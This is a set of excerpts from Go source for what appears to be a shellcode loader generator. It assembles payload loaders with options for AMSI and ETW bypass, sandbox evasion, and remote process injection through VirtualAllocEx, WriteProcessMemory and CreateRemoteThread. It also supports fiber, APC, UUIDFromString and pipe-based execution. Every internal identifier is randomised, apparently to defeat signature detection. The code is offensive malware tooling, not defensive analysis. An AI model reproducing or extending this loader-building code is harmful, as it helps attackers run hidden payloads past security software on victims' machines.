...
func Imports_Buff(binary bool, console bool, sandbox bool, injection string, evasion string, ETW bool, AMSI bool, Exec_Type string) string {
	var buffer bytes.Buffer
	Imports := &Header{}
	...
	if (injection != "" && Exec_Type == "PipeInjection") || Exec_Type == "UUIDFromString" {
		Imports.Variables["binary_Import"] = `"encoding/binary"`
	} else {
		Imports.Variables["binary_Import"] = ""
	}
	if Exec_Type == "UUIDFromString" {
		Imports.Variables["googleUUID"] = `"github.com/google/uuid"`
		Imports.Variables["bytes_header"] = `"bytes"`
	} else {
		Imports.Variables["googleUUID"] = ""
...
func Header_Buff(binary bool, AMSI bool, ETW bool, ProcessInjection string, console bool, sandbox bool, evasion string, Exec_Type string) (string, string, string, string, string, string, string, string, string, string, string, string, string) {
	var buffer bytes.Buffer
	Header := &Header{}
	...
	Header.Variables["Imports"] = Imports_Buff(binary, console, sandbox, ProcessInjection, evasion, ETW, AMSI, Exec_Type)
...
func Binaryfile(b64ciphertext string, b64key string, b64iv string, mode string, console bool, sandbox bool, name string, ETW bool, ProcessInjection string, Sleep bool, AMSI bool, export string, Exec_Type string, evasion string) (string, string, string) {
	...
	Header, ETWFunctionName, AMSIFunctionName, Versionfunc, Version, customsyscall, customsyscallVP, Sandbox, Console, PROCESS_ALL_ACCESS, WriteProcessMemory, FindAddress, RemoteETWFunctionName := Header_Buff(binary, AMSI, ETW, ProcessInjection, console, sandbox, evasion, Exec_Type)
...
func Shellcode_Loader_Buff(Exec_Type string, ProcessInjection string, customsyscall string, customsyscallVP string, PROCESS_ALL_ACCESS string, WriteProcessMemory string, console bool, FindAddress string, RemoteETWFunctionName string) (string, string, string) {
	...
	//Syscall_CreateFiber
	Shellcode_Loader.Variables["ConvertThreadToFiber"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["CreateFiber"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["SwitchToFiber"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["fiberAddr"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["fiberSupportaddr"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["VirtualProtect"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["fiber"] = Cryptor.VarNumberLength(10, 19)
	...
	//EnumLoadedModules
	Shellcode_Loader.Variables["FunctionName"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["addrNO"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["GetCurrentProcess"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["dbghelp"] = Cryptor.VarNumberLength(10, 19)
	...
	Shellcode_Loader.Variables["pHandle"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["kernel32"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["procCreateToolhelp32Snapshot"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["procProcess32First"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["procProcess32Next"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["WriteProcessMemory"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["OpenProcess"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["CloseHandle"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["VirtualAllocEx"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["VirtualProtectEx"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["CreateRemoteThread"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["TH32CS_SNAPPROCESS"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["FunctionName"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["raw_bin"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["processes"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["FunctionGetProcesses"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["pidToInject"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["process"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["processName"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["oldProtect"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["thread"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["entry"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["nextErr"] = Cryptor.VarNumberLength(10, 19)

	//UUID Loader
	Shellcode_Loader.Variables["uuids"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["FunctionName2"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["rpcrt4"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["heapCreate"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["heapAlloc"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["enumSystemLocalesA"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["uuidFromString"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["heapAddr"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["addrPtr"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["uuid"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["ret"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["pad"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["uuidBytes"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["usef"] = Cryptor.VarNumberLength(10, 19)

	// Pipe Injection
	Shellcode_Loader.Variables["program"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["NtQueryInformationProcess"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["stdInRead"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["stdInWrite"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["stdOutRead"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["stdOutWrite"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["stdErrRead"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["stdErrWrite"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["procInfo"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["processInformation"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["returnLength"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["ReadProcessMemory"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["peb"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["readBytes"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["dosHeader"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["readBytes2"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["Signature"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["readBytes3"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["peHeader"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["readBytes4"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["optHeader64"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["optHeader32"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["readBytes5"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["ep"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["epBuffer"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["shellcodeAddressBuffer"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["nNumberOfBytesToRead"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["stdOutBuffer"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["stdOutDone"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["stdOutOverlapped"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["stdErrBuffer"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["stdErrDone"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["stdErrOverlapped"] = Cryptor.VarNumberLength(10, 19)
	...
	if ProcessInjection != "" {
		...
		if Exec_Type == "PipeInjection" {
			Structure = Struct.Pipe_Injection()
		} else {
	...
	if Exec_Type == "CreateFiber" {
		Structure = Struct.Syscall_CreateFiber()
	}
	if Exec_Type == "NtQueueApcThreadEx" {
		Structure = Struct.Syscall_NtQueueAPCThreadEx_Local()
	}
	if Exec_Type == "EnumLoadedModules" {
		Structure = Struct.Syscall_EnumLoadedModules()
	}
	if Exec_Type == "UUIDFromString" {
